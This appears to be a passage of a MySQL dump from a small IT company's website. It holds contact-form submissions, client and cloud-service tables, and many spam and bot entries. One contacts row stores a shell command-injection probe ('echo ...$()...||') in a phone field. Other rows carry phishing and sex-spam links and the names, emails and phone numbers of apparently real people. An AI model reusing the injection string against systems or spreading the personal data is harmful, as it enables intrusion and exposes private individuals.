(5, 'Tamara', 'Colon', 'fixed@mailinator.com', '+1 (692) 753-2001', 'Bonner and Haynes Associates', 'Unde quo ut nostrum', 'Ullam quibusdam illo', 'Unde quo ut nostrum', '', '60', '2024-10-08 00:55:14', '2024-10-08 00:55:14'),
(6, 'Victoria', 'Head', 'noce@mailinator.com', '+1 (586) 674-4159', 'Guthrie Blankenship Associates', 'Dolor esse facere po', 'Voluptatem Eaque qu', 'Dolor esse facere po', '1728367155.png', '52', '2024-10-08 00:59:15', '2024-10-08 00:59:15'),
(7, 'MasonGawWM', 'MasonGawWM', 'somasesokiyo31@gmail.com', '82351667352', 'google', NULL, NULL, NULL, '', '141312', '2024-10-23 22:40:16', '2024-10-23 22:40:16'),
(8, 'sa', 'x', 'ds@s', 'ds', 'sd', 'x', 'ss', 'x', '', '12', '2024-10-24 04:02:15', '2024-10-24 04:02:15'),
(9, 'AmandaalenepencGB', 'Amandaalenepen2GB', 'amandaOccataa@gmail.com', '88662969131', 'google', NULL, NULL, NULL, '', '124244', '2024-10-26 00:45:59', '2024-10-26 00:45:59'),
(10, 'TedGawLW', 'TedGawLW', 'axobajigufo34@gmail.com', '89553866727', 'google', NULL, NULL, NULL, '', '112152', '2024-10-27 04:53:11', '2024-10-27 04:53:11'),
(11, 'MasonGawWM', 'MasonGawWM', 'yawiviseya67@gmail.com', '81156471679', 'google', NULL, NULL, NULL, '', '143525', '2024-10-27 04:53:55', '2024-10-27 04:53:55'),
(12, 'Amandaalenepen2GB', 'Amandaalenepen3GB', 'amandaOccatab@gmail.com', '84512882799', 'google', NULL, NULL, NULL, '', '121135', '2024-10-27 22:56:43', '2024-10-27 22:56:43'),
(13, 'Anum', 'Shabbir', 'anamshabbir44@gmail.com', '03150403148', 'Work Generations Pvt Ltd.', 'WordPress Developer and IT Officer', NULL, 'WordPress Developer and IT Officer', '1730093851.pdf', '-1', '2024-10-28 04:37:31', '2024-10-28 04:37:31'),
(15, 'Bismiallah', 'wafadar', 'bismullahwafadar5@gmail.com', '0705402660', 'LuiLala', 'Front end developer', 'Traning', 'Front end developer', '', NULL, '2024-11-01 11:13:32', '2024-11-01 11:13:32'),
(19, 'Amandaalenepen1GB', 'Amandaalenepen2GB', 'amandaOccatac@gmail.com', '85962819122', 'google', NULL, NULL, NULL, '', '141451', '2024-11-05 03:45:42', '2024-11-05 03:45:42'),
(20, 'Ana', 'Maldonado', 'ana@visualvdesign.com', '854380264', 'Visual Design', NULL, 'Creativeitpark en Prensa', NULL, '', '990', '2024-11-09 13:03:54', '2024-11-09 13:03:54'),
(21, 'IsaacmusRA', 'IsaacmusRA', 'cl1fioctpgxe1yv@tempmail.us.com', '83761544443', 'google', 'AccBulk', 'AccBulk', 'AccBulk', '', '133212', '2024-11-10 17:30:52', '2024-11-10 17:30:52'),
(22, 'Amandaalenepen3GB', 'Amandaalenepen3GB', 'amandaOccata1@gmail.com', '86494781986', 'google', NULL, NULL, NULL, '', '111541', '2024-11-11 08:34:50', '2024-11-11 08:34:50'),
(23, 'James', 'Martin', 'marketing@bose-usa.com', '6469563718', 'BOSE Corporation', 'CEO', 'Social Media', 'CEO', '', NULL, '2024-11-13 15:03:29', '2024-11-13 15:03:29'),
(25, 'AmandaalenepenaGB', 'Amandaalenepen3GB', 'amandaOccata3@gmail.com', '81729229444', 'google', NULL, NULL, NULL, '', '154221', '2024-11-17 02:53:58', '2024-11-17 02:53:58'),
(26, 'Haris', 'Jabbar', 'harisjabbar24@gmail.com', '03168526645', 'Friends It Solution', 'Front End Web developer', 'N/A', 'Front End Web developer', '1732114974.pdf', NULL, '2024-11-20 14:02:54', '2024-11-20 14:02:54'),
(29, 'Nerea', 'Moya', 'nerea@databoxmarketresearch.com', '854380270', 'Data box', NULL, 'Propuesta para Creativeitpark', NULL, '', '890', '2024-11-28 13:57:33', '2024-11-28 13:57:33'),
(31, 'Mike Morgan', 'Mike Morgan', 'mikexxxx@gmail.com', '89442496972', 'google', NULL, NULL, NULL, '', '113251', '2024-11-30 21:08:03', '2024-11-30 21:08:03'),
(33, 'MiguelReirmRK', 'MiguelReirmRK', 'hsbc-info@e.mail.fr', '81889325347', 'google', NULL, NULL, NULL, '', '133355', '2024-12-02 20:43:51', '2024-12-02 20:43:51'),
(34, 'Tobias Jones', 'Tobias Jones', 'info@professionalseocleanup.com', '85399969866', 'google', NULL, NULL, NULL, '', '115511', '2024-12-04 09:05:15', '2024-12-04 09:05:15'),
(35, 'test', 'test', 'test@gmail.com', '0000000', 'test', 'test', 'test', 'test', '', '10', '2024-12-11 06:58:33', '2024-12-11 06:58:33'),
(36, 'LiskarianeDS', 'LiskarianeDS', 'astremovastramirello@gmail.com', '85484473873', 'google', NULL, NULL, NULL, '', '122254', '2024-12-13 17:21:18', '2024-12-13 17:21:18'),
(37, 'Ihtisham', 'Shahzad', 'ehtishamshahzad675@gmail.com', '03406061029', 'IT', 'IT officer', NULL, 'IT officer', '', NULL, '2024-12-14 06:30:41', '2024-12-14 06:30:41'),
(38, 'NAEWTRER2793313NEYHRTGE', 'NAEWTRER2793313NEYHRTGE', 'garybrown1920@quieresmail.com', '84278199521', 'google', NULL, NULL, NULL, '', '133231', '2024-12-14 08:51:25', '2024-12-14 08:51:25'),
(40, 'snursodo', 'snursodo', 'txrlzhot@icloud.com', '82566854676', 'google', NULL, NULL, NULL, '', '145545', '2024-12-16 02:27:05', '2024-12-16 02:27:05'),
(41, 'Beatriz', 'Cabrera', 'Beatriz@agenciapvsocial.com', '919931541', 'Agencia PV', NULL, 'Propuesta para Creativeitpark', NULL, '', '921', '2024-12-19 07:18:12', '2024-12-19 07:18:12'),
(43, 'snursodo', 'snursodo', 'oiqod6de@yahoo.com', '87978511354', 'google', NULL, NULL, NULL, '', '142233', '2024-12-23 11:32:34', '2024-12-23 11:32:34'),
(46, 'Hussain', 'Ahmed', 'hussain@theteacherstraining.com', '02045156229', 'The Teachers Training', 'Business Development Manager', 'Business Opportunity With The Teachers Training', 'Business Development Manager', '', '00', '2024-12-25 09:43:22', '2024-12-25 09:43:22'),
(47, 'snursodo', 'snursodo', '53xqtx9r@hotmail.com', '83528443996', 'google', NULL, NULL, NULL, '', '121511', '2024-12-26 02:00:56', '2024-12-26 02:00:56'),
(49, 'I want sex>>> https://ugy2mr2.auraflirtsdreams.com/dkf8d6u?m=1IN', 'I want sex>>> https://ugy2mr2.auraflirtsdreams.com/dkf8d6u?m=1IN', 'raya.gritsenko.91@mail.ru', '81358973857', 'google', 'I want sex>>> https://ugy2mr2.auraflirtsdreams.com/dkf8d6u?m=1', 'I want sex>>> https://ugy2mr2.auraflirtsdreams.com/dkf8d6u?m=1', 'I want sex>>> https://ugy2mr2.auraflirtsdreams.com/dkf8d6u?m=1', '', '111233', '2024-12-28 16:11:56', '2024-12-28 16:11:56'),
(50, 'zvusalmecnjqzrcGP', 'xvusaymemtaoxftGP', 'mpalexa@gmail.com', '83573412751', 'google', NULL, NULL, NULL, '', '122115', '2024-12-29 16:33:56', '2024-12-29 16:33:56'),
(51, 'szusafmeqtodzalGP', 'xzusafmeatqvxmzGP', 'matiquesalon@yahoo.com', '88669841224', 'google', NULL, NULL, NULL, '', '132125', '2024-12-30 06:02:20', '2024-12-30 06:02:20'),
(52, 'xwusaymedtfncuuGP', 'swusalmermqpdzhGP', 'lichtiensinh@gmail.com', '86251475589', 'google', NULL, NULL, NULL, '', '125212', '2024-12-31 22:27:58', '2024-12-31 22:27:58'),
(53, 'snursodo', 'snursodo', 'h8rsnmhs@yahoo.com', '83574515383', 'google', NULL, NULL, NULL, '', '132344', '2024-12-31 23:03:16', '2024-12-31 23:03:16'),
(54, 'Patricia', 'Vazquez', 'patricia@marketingseo360.com', '936940906', 'Marketing 360', NULL, 'Propuesta para Creativeitpark', NULL, '', '891', '2025-01-01 17:53:02', '2025-01-01 17:53:02'),
(56, 'RaymondensugMW', 'RaymondensugMW', 'raymonddiogue@gmail.com', '85356951468', 'google', NULL, NULL, NULL, '', '122515', '2025-01-04 04:05:06', '2025-01-04 04:05:06'),
(57, 'Mike Aleksander Bonnet\r\nMJ', 'Mike Aleksander Bonnet\r\nMJ', 'mike@monkeydigital.co', '87248237782', 'google', NULL, NULL, NULL, '', '125354', '2025-01-05 02:23:32', '2025-01-05 02:23:32'),
(58, 'zzusalmetnoizvcGP', 'swusaymejtvozcyGP', 'sheila6353@hotmail.com', '87461381188', 'google', NULL, NULL, NULL, '', '125333', '2025-01-06 15:28:42', '2025-01-06 15:28:42'),
(59, 'OneAI 2', 'OneAI 2', 'deal@new-oneai.com', '84336845298', 'google', NULL, NULL, NULL, '', '122155', '2025-02-05 04:12:41', '2025-02-05 04:12:41'),
(60, 'Ravi', 'Roy', 'businessgrowtogether@outlook.com', '5416712677', 'Personal Assistant', NULL, NULL, NULL, '', NULL, '2025-02-05 09:11:06', '2025-02-05 09:11:06'),
(61, 'xzusaymeptwsc3fGP', 'zzusafmedtgazlsGP', 'mohammed.alezeb@gmail.com', '89325689881', 'google', NULL, NULL, NULL, '', '135331', '2025-02-05 20:50:09', '2025-02-05 20:50:09'),
(62, 'snursodo', 'snursodo', '75swgr1a@gmail.com', '86632952194', 'google', NULL, NULL, NULL, '', '124333', '2025-02-05 23:14:21', '2025-02-05 23:14:21'),
(63, 'zvusalmeotatx2hGP', 'xwusafmeatjcdrhGP', 'pittssh@bellsouth.net', '86982661493', 'google', NULL, NULL, NULL, '', '115232', '2025-02-06 15:39:56', '2025-02-06 15:39:56'),
(64, 'zwusafmecmlozehGP', 'xwusafmeinwox2oGP', 'gail@fayjpackaging.com', '84141162684', 'google', NULL, NULL, NULL, '', '112412', '2025-02-06 22:24:47', '2025-02-06 22:24:47'),
(65, 'snursodo', 'snursodo', 'lfy7gzlf@hotmail.com', '85923174385', 'google', NULL, NULL, NULL, '', '124145', '2025-02-07 01:30:31', '2025-02-07 01:30:31'),
(66, 'xvusaymeenyzczcGP', 'zzusalmegnsjx3eGP', 'belindadelacruz@gmail.com', '84195481275', 'google', NULL, NULL, NULL, '', '135324', '2025-02-07 04:45:11', '2025-02-07 04:45:11'),
(67, 'BennypydayER', 'BennypydayER', 'dimdim333@gmail.com', '87874346316', 'google', NULL, NULL, NULL, '', '122534', '2025-02-09 21:24:55', '2025-02-09 21:24:55'),
(68, 'Mike Jules David\r\nCV', 'Mike Jules David\r\nCV', 'info@digitalxflow.com', '86986253549', 'google', NULL, NULL, NULL, '', '144445', '2025-02-09 21:56:50', '2025-02-09 21:56:50'),
(69, 'xzusalmeumatxsxGP', 'zzusaymebtofxjqGP', 'dsemyers1@gmail.com', '84862947644', 'google', NULL, NULL, NULL, '', '124432', '2025-02-09 22:34:05', '2025-02-09 22:34:05'),
(70, 'Значение снов по известным толкователям — Нострадамуса и другихMD', 'Расшифровка сна по известным толкователям — МиллераMD', 'mail2.61@mail.androsapp.ru', '85851421393', 'google', NULL, NULL, NULL, '', '152124', '2025-02-10 01:01:01', '2025-02-10 01:01:01'),
(71, 'Deepu', 'Singh', 'videoexpertss@outlook.com', '6805150765', 'Video Editing and Video Production', NULL, NULL, NULL, '', NULL, '2025-02-10 05:15:07', '2025-02-10 05:15:07'),
(72, 'NrmandmeacyOS', 'NrmandmeacyOS', 'your77@gmail.com', '89675744818', 'google', NULL, NULL, NULL, '', '122433', '2025-02-11 02:36:27', '2025-02-11 02:36:27'),
(73, 'Krish', 'Mehta', 'webcontentwriting12@outlook.com', '414051796', 'Freelance Content Writer', NULL, NULL, NULL, '', NULL, '2025-02-11 13:47:22', '2025-02-11 13:47:22'),
(74, 'xvusaymewtdhzbpGP', 'xvusaymednknzkfGP', 'raj.live@aol.co.uk', '88928739666', 'google', NULL, NULL, NULL, '', '135225', '2025-02-12 07:39:56', '2025-02-12 07:39:56'),
(75, 'anticyVM', 'anticyVM', 'strokanviktorija@mail.ru', '81659293631', 'google', NULL, NULL, NULL, '', '112532', '2025-02-12 08:59:08', '2025-02-12 08:59:08'),
(76, 'Valeron83tawXM', 'Valeron83tawXM', 'romabookim@gmail.com', '82197846594', 'google', NULL, NULL, NULL, '', '135333', '2025-02-13 07:58:51', '2025-02-13 07:58:51'),
(77, 'anticyVM', 'anticyVM', 'olga.gricenko.79@mail.ru', '87173871329', 'google', NULL, NULL, NULL, '', '145433', '2025-02-13 08:51:37', '2025-02-13 08:51:37'),
(78, 'Mike Christopher Olsen\r\nRD', 'Mike Christopher Olsen\r\nRD', 'check-message1313@gmail.com', '87385662386', 'google', NULL, NULL, NULL, '', '123342', '2025-02-14 09:47:13', '2025-02-14 09:47:13'),
(80, 'Merlin AI StiltFZ', 'Merlin AI StiltFZ', 'risic1497@gazeta.pl', '89294114718', 'google', NULL, NULL, NULL, '', '122231', '2025-02-16 20:15:37', '2025-02-16 20:15:37'),
(81, 'anticyVM', 'anticyVM', 'emakassir@yahoo.com', '82113793664', 'google', NULL, NULL, NULL, '', '125233', '2025-02-17 11:05:46', '2025-02-17 11:05:46'),
(82, 'xzusafme2tqhxpoGP', 'zwusafmedtkqxecGP', 'kbrown@reprographicarts.com', '83523197885', 'google', NULL, NULL, NULL, '', '141554', '2025-02-17 11:27:21', '2025-02-17 11:27:21'),
(83, 'anticyVM', 'anticyVM', 'blackseodoorway@vk.com', '83733563133', 'google', NULL, NULL, NULL, '', '152234', '2025-02-18 19:54:17', '2025-02-18 19:54:17'),
(84, 'Nicholas Doby', 'Nicholas Doby', 'dobyfinancial@sendnow.win', '86686589472', 'google', NULL, NULL, NULL, '', '142143', '2025-02-19 00:28:43', '2025-02-19 00:28:43'),
(85, 'XRumer23tawYM', 'XRumer23tawYM', 'xrumer23taw@gmail.com', '81411156583', 'google', NULL, NULL, NULL, '', '111435', '2025-02-19 05:37:54', '2025-02-19 05:37:54'),
(86, 'anticyVM', 'anticyVM', 'recirc@gmail.com', '84854281346', 'google', NULL, NULL, NULL, '', '115413', '2025-02-19 11:28:49', '2025-02-19 11:28:49'),
(87, 'svusaymeynzsxhlGP', 'xwusaymeynlydyjGP', 'raysosebee@gmail.com', '82467551239', 'google', NULL, NULL, NULL, '', '152313', '2025-02-19 13:48:52', '2025-02-19 13:48:52'),
(88, 'VocalClone AI', 'VocalClone AI', 'deal@vocalcloneai.com', '81968199742', 'google', NULL, NULL, NULL, '', '155223', '2025-02-19 14:17:27', '2025-02-19 14:17:27'),
(89, 'Mike Elias Smit\r\nSK', 'Mike Elias Smit\r\nSK', 'check-message5455@gmail.com', '81548299718', 'google', NULL, NULL, NULL, '', '155344', '2025-02-19 17:25:45', '2025-02-19 17:25:45'),
(90, 'Kenneth', 'McMann', 'mcmann.kenneth@gmail.com', '3504377145', 'Kenneth McMann', NULL, NULL, NULL, '', NULL, '2025-02-19 20:27:33', '2025-02-19 20:27:33'),
(91, 'Yasuhiro Yamada', 'Yasuhiro Yamada', 'rohtopharmaceutical@via.tokyo.jp', '86539476231', 'google', NULL, NULL, NULL, '', '123153', '2025-02-20 04:07:07', '2025-02-20 04:07:07'),
(92, 'Kisha', 'Kilpatrick', 'kilpatrick.kisha@outlook.com', '7950149797', 'Kisha Kilpatrick', NULL, NULL, NULL, '', NULL, '2025-02-20 07:14:58', '2025-02-20 07:14:58'),
(93, 'Mike Claude Martin\r\nKY', 'Mike Claude Martin\r\nKY', 'check-message1672@gmail.com', '82215814468', 'google', NULL, NULL, NULL, '', '134133', '2025-02-20 11:40:30', '2025-02-20 11:40:30'),
(94, 'zwusafmetmpgcbfGP', 'xvusaymebnftzzhGP', 'p_pharma1@protonmail.com', '87895718873', 'google', NULL, NULL, NULL, '', '141412', '2025-02-20 14:12:24', '2025-02-20 14:12:24'),
(96, 'xvusafmeytgrdtrGP', 'xzusalmeoncyd2pGP', 'jhskylink@yahoo.com', '86749339168', 'google', NULL, NULL, NULL, '', '143212', '2025-02-21 13:16:43', '2025-02-21 13:16:43'),
(97, 'swusaymeutsfzpxGP', 'xwusalmeptbqc3lGP', 'moacct2013@gmail.com', '83569318717', 'google', NULL, NULL, NULL, '', '113445', '2025-02-22 15:49:44', '2025-02-22 15:49:44'),
(98, 'NormbbggmeacyMJ', 'NormbbggmeacyMJ', 'yourmail@gmail.com', '84243175287', 'google', NULL, NULL, NULL, '', '155255', '2025-02-22 20:43:07', '2025-02-22 20:43:07'),
(99, 'Noah', 'Aleman', 'aleman.noah@gmail.com', '7056454929', 'Noah Aleman', NULL, NULL, NULL, '', NULL, '2025-02-23 09:17:55', '2025-02-23 09:17:55'),
(100, 'Viren', 'Shah', 'fastprocess006@outlook.com', '527234160', 'Reliable & Cost-Effective Back-Office Outsourcing Solutions', NULL, NULL, NULL, '', NULL, '2025-02-24 00:32:11', '2025-02-24 00:32:11'),
(101, 'NormandmeacyCW', 'NormandmeacyCW', 'yourmail344@gmail.com', '87133563291', 'google', NULL, NULL, NULL, '', '125425', '2025-02-24 09:28:00', '2025-02-24 09:28:00'),
(103, 'anticyVM', 'anticyVM', 'dwinbar56@hotmail.com', '82744751316', 'google', NULL, NULL, NULL, '', '134511', '2025-02-25 21:39:12', '2025-02-25 21:39:12'),
(104, '<a href=\"https://goo.com\"><img src=\"https://webref.ru/example/image/panda.png\" alt=\"\"></a>', '<a href=\"https://goo.com\"><img src=\"https://webref.ru/example/image/panda.png\" alt=\"\"></a>', 'xrum011@24red.ru', '81282491929', 'google', NULL, NULL, NULL, '', '154514', '2025-02-26 12:58:51', '2025-02-26 12:58:51'),
(105, 'Rony', 'Jay', 'hireonline4455@outlook.com', '248915543', 'Affordable Data Solutions to Save Time & Grow Your Business', NULL, NULL, NULL, '', NULL, '2025-02-27 12:26:04', '2025-02-27 12:26:04'),
(106, 'NormdmeacyAC', 'NormdmeacyAC', 'your88@gmail.com', '86857197661', 'google', NULL, NULL, NULL, '', '142155', '2025-02-27 22:16:55', '2025-02-27 22:16:55'),
(107, 'anticyVM', 'anticyVM', 'ason0122@gmail.com', '84123219875', 'google', NULL, NULL, NULL, '', '151253', '2025-02-28 09:17:21', '2025-02-28 09:17:21'),
(109, 'Praveen', 'Patel', 'venture4help@outlook.com', '3995324853', 'Reliable & Affordable Data Collection & Web Research Services', NULL, NULL, NULL, '', NULL, '2025-03-01 11:00:39', '2025-03-01 11:00:39'),
(110, 'zzusalmetthndehGP', 'xvusalmeutggxxmGP', 'ajkozikoski@yahoo.com', '81551192474', 'google', NULL, NULL, NULL, '', '122444', '2025-03-01 11:48:40', '2025-03-01 11:48:40'),
(112, 'MichaeldromoAY', 'MichaeldromoAY', 'nomin.momin+374l9@mail.ru', '81715679999', 'google', NULL, NULL, NULL, '', '153443', '2025-03-02 19:05:04', '2025-03-02 19:05:04'),
(115, 'zvusaymefnhrclrGP', 'xvusalmexnqlxnoGP', 'rsmrsw@gmail.com', '85825521959', 'google', NULL, NULL, NULL, '', '154253', '2025-03-03 18:52:15', '2025-03-03 18:52:15'),
(118, 'xzusaymeztndcxsGP', 'szusalmeltnpzunGP', 'starreleeper@me.com', '82845917182', 'google', NULL, NULL, NULL, '', '123455', '2025-03-05 15:08:22', '2025-03-05 15:08:22'),
(119, 'Mandy', 'Singh', 'creativeteamhire@outlook.com', '7192568860', 'Freelance Content Writer', NULL, NULL, NULL, '', NULL, '2025-03-06 06:49:26', '2025-03-06 06:49:26'),
(120, 'Kevin', 'Barber', 'arlen.valazquez@hotmail.com', '41615249', 'Arlen Valazquez', NULL, NULL, NULL, '', NULL, '2025-03-07 16:14:37', '2025-03-07 16:14:37'),
(122, 'okmanenaVJ', 'okmanenaVJ', 'oknaekaterinburg@rambler.ru', '83316559975', 'google', NULL, NULL, NULL, '', '123545', '2025-03-08 14:03:53', '2025-03-08 14:03:53'),
(123, 'Ines', 'Serrano', 'ines@agenciainstantseo.com', '842918813', 'agencia instant seo', NULL, 'Creativeitpark propuesta', NULL, '', '894', '2025-03-09 10:19:56', '2025-03-09 10:19:56'),
(124, 'Mike Dirk Thomas\r\nCV', 'Mike Dirk Thomas\r\nCV', 'info@digital-x-press.com', '84165358878', 'google', NULL, NULL, NULL, '', '135234', '2025-03-09 11:33:01', '2025-03-09 11:33:01'),
(125, 'Sam', 'Modi', 'webdesignservices111@outlook.com', '40473462', 'High-End Custom Website Designing', NULL, NULL, NULL, '', NULL, '2025-03-11 02:53:05', '2025-03-11 02:53:05'),
(127, 'xzusalme2mbdcivGP', 'zvusafmemtiwdqyGP', 'n.vanstijn@axxor.com', '83133386129', 'google', NULL, NULL, NULL, '', '144114', '2025-03-11 10:57:42', '2025-03-11 10:57:42'),
(128, 'Monica WoxHC', 'Monica WoxHC', 'stephaniebuvona@gazeta.pl', '81261593862', 'google', NULL, NULL, NULL, '', '131314', '2025-03-11 11:48:48', '2025-03-11 11:48:48'),
(129, 'Mike Thijs Willems\r\nRD', 'Mike Thijs Willems\r\nRD', 'info@strictlydigital.net', '87693742949', 'google', NULL, NULL, NULL, '', '144113', '2025-03-13 02:01:50', '2025-03-13 02:01:50'),
(130, 'Max', 'Lammertink', 'max@talosgrowth.nl', '687537670', 'Talos Growth', NULL, NULL, NULL, '', NULL, '2025-03-13 09:39:19', '2025-03-13 09:39:19'),
(131, 'Antonia', 'Gimenez', 'antonia@agenciainstantseo.com', '936940906', 'agencia instant seo', NULL, 'Creativeitpark propuesta', NULL, '', '934', '2025-03-15 13:19:38', '2025-03-15 13:19:38'),
(133, 'StevenblowsME', 'StevenblowsME', 'stepankyz.gg@gmail.com', '81936244537', 'google', NULL, NULL, NULL, '', '132151', '2025-03-18 10:07:46', '2025-03-18 10:07:46'),
(134, 'xzusalmevncddkrGP', 'zzusalmeqttzzdeGP', 'danifdantas@gmail.com', '89598277382', 'google', NULL, NULL, NULL, '', '153533', '2025-03-18 15:59:27', '2025-03-18 15:59:27'),
(135, 'Paul', 'Reddy', 'projectsexpert222@outlook.com', '3606096889', 'Business Process Associate', NULL, NULL, NULL, '', NULL, '2025-03-18 16:15:57', '2025-03-18 16:15:57'),
(139, 'Naveen', 'Jindal', 'brandbuildingassistance@outlook.com', '861605937', 'SEO for creativeitpark.org', NULL, NULL, NULL, '', NULL, '2025-03-21 13:33:45', '2025-03-21 13:33:45'),
(140, 'JamesGesOY', 'JamesGesOY', 'dtahmazov@mail.ru', '86975749835', 'google', NULL, NULL, NULL, '', '114344', '2025-03-22 02:30:20', '2025-03-22 02:30:20'),
(142, 'Saqib', 'zareen', 'saqib@example.com', '03125155183', 'creative', 'HR', 'saas products', 'HR', '', NULL, '2025-03-24 05:02:41', '2025-03-24 05:02:41'),
(143, 'saqi', 'aa', 'saqi@gmail.com', '03232222=-)ZI', 'it company', 'hr', 'aa', 'hr', '', NULL, '2025-03-24 08:35:51', '2025-03-24 08:35:51'),
(146, 'Chiquita', 'Holt', 'wyhorobi@mailinator.com', '+1 (739) 116-5491', 'Case Shaw Traders', 'Omnis itaque elit s', 'Veritatis impedit a', 'Omnis itaque elit s', '', '6', '2025-03-25 04:14:35', '2025-03-25 04:14:35'),
(152, 'QlqzzNwr', 'QlqzzNwr', 'testing@example.com', '555-666-0606', 'Testing', '1', '1', '1', '', '1', '2025-10-07 20:36:40', '2025-10-07 20:36:40'),
(155, '* * * $3,222 credit available! Confirm your operation here: http://www.motorolapromocionesmm.com/?2wd62e * * * hs=fc038da6b9fd639b2ac5a0c17261dd3a* ххх*', 'lssad4', 'ydx~nwa9pwyxz@mailbox.in.ua', '179745232684', 'juvdwi', '8rpnvq', 'ulrq4f', '8rpnvq', '1765378892.jpg', 'qz2m10', '2025-12-10 14:01:32', '2025-12-10 14:01:32'),
(158, 'Nasir', 'Ismail', 'nasirismaeel@gmail.com', '03006464641', 'Neuron Nexus', 'owner', 'Business incubation centre', 'owner', '', NULL, '2026-01-23 11:24:23', '2026-01-23 11:24:23');

-- --------------------------------------------------------

--
-- Table structure for table `career_contacts`
--

CREATE TABLE `career_contacts` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `First Name` varchar(255) NOT NULL,
  `Last Name` varchar(255) NOT NULL,
  `Email Address` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `clients`
--

CREATE TABLE `clients` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(225) NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `link` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `clients`
--

INSERT INTO `clients` (`id`, `name`, `image`, `link`, `created_at`, `updated_at`) VALUES
(1, 'Capital development Authority', '1722582657.png', 'https://creativeitpark.org/', '2024-08-02 02:10:57', '2024-08-05 01:11:21'),
(2, 'Rawalpindi Chamber of Commerce and Industry', '1722594262.png', 'https://rcci.org.pk/', '2024-08-02 05:24:22', '2024-10-14 02:59:08'),
(3, 'Azad Jammu & Kashmir', '1722594278.png', 'https://ajk.gov.pk/', '2024-08-02 05:24:38', '2024-08-07 02:50:16'),
(4, 'Rawalpindi women University', '1722594286.png', 'https://rwu.edu.pk/', '2024-08-02 05:24:46', '2024-08-07 02:51:16'),
(5, 'SLS', '1722594297.png', 'https://school.creativeitpark.org/', '2024-08-02 05:24:57', '2024-08-07 02:52:06'),
(6, 'Mindstir', '1722594312.png', 'https://mindstir.space/', '2024-08-02 05:25:12', '2024-08-07 02:53:41');

-- --------------------------------------------------------

--
-- Table structure for table `cloud_services`
--

CREATE TABLE `cloud_services` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `heading` varchar(255) NOT NULL,
  `description` varchar(1024) DEFAULT NULL,
  `type` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `cloud_services`
--

INSERT INTO `cloud_services` (`id`, `heading`, `description`, `type`, `created_at`, `updated_at`) VALUES
(1, 'Application Security', 'Explore our comprehensive cloud security solutions, including robust application security measures tailored to protect your digital assets. Our proactive approach to application security ensures that your applications are safeguarded against potential threats and vulnerabilities, providing peace of mind for your business operations.', 'security', '2024-07-31 03:34:05', '2024-07-31 03:34:05'),
(2, 'Data Protection', 'Discover our cloud security solutions, featuring advanced data protection measures to safeguard your sensitive information. Our comprehensive approach to data protection ensures that your data remains secure and compliant, mitigating risks and maintaining trust with your customers.', 'security', '2024-07-31 03:37:32', '2024-07-31 03:37:32'),
(3, 'Cloud Native Security Services', 'Elevate your security posture with our cloud-native security services, tailored for seamless integration and protection in cloud environments.', 'advantages', '2024-07-31 03:53:56', '2024-07-31 03:53:56'),
(4, 'Multi Cloud Security', 'Enhance security across diverse multi-cloud environments with our adaptable and comprehensive solutions, ensuring robust protection.', 'advantages', '2024-07-31 03:54:32', '2024-07-31 03:54:32');

-- --------------------------------------------------------

--
-- Table structure for table `contacts`
--

CREATE TABLE `contacts` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `phone` varchar(255) NOT NULL,
  `agree` int(11) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `image` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `contacts`
--

INSERT INTO `contacts` (`id`, `name`, `email`, `phone`, `agree`, `description`, `image`, `created_at`, `updated_at`) VALUES
(1, 'fdbf', 'admin@example.com', 'egreb', 1, NULL, '', '2024-08-08 00:10:22', '2024-08-08 00:10:22'),
(2, 'Kasimir Sims', 'habaly@mailinator.com', '+1 (219) 673-6142', 0, 'Et explicabo In et', '', '2024-08-08 00:11:07', '2024-08-08 00:11:07'),
(4, 'Kieran Carney', 'myfexumot@mailinator.com', '+1 (131) 639-9584', 1, 'Nostrum deserunt ips', '', '2024-08-08 00:11:27', '2024-08-08 00:11:27'),
(5, 'ncMUFCMU', 'sample@email.tst', 'echo eaxrdu$()\\ uidnsx\\nz^xyu||a #\' &echo eaxrdu$()\\ uidnsx\\nz^xyu||a #|\" &echo eaxrdu$()\\ uidnsx\\nz^xyu||a #', 1, '20', '', '2025-03-14 19:18:39', '2025-03-14 19:18:39'),
(13, 'Kameko Morris', 'zajugare@mailinator.com', '86', 1, NULL, '', '2025-03-24 05:17:54', '2025-03-24 05:17:54'),
(14, 'Julie Kent', 'duxyxobyr@mailinator.com', '44', 1, 'Sint dolor optio la', '', '2025-03-24 06:27:07', '2025-03-24 06:27:07'),
(15, 'talha zar', 'shinymalik413@gmail.com', '03125155183', 1, 'Nisi est ut est volu', '', '2025-03-25 05:08:27', '2025-03-25 05:08:27'),
(16, 'astozdor', 'astozdor@yandex.ru', '87116795256', 1, 'Приглашаем приходите на сайт на тему <a href=https://xn--80a.store/здоровье.html>Здоровье</a>', '', '2025-03-26 08:49:01', '2025-03-26 08:49:01'),
(17, 'CHIRPxto', 'brian.white2974@gmail.com', '82549825149', 1, NULL, '', '2025-03-26 09:00:29', '2025-03-26 09:00:29'),
(18, 'semmish', 's.e.m.en.vatut.i.nhomew.o.r.k.1.98.80828.@gmail.com', '86647714853', 1, NULL, '', '2025-03-27 03:11:32', '2025-03-27 03:11:32'),
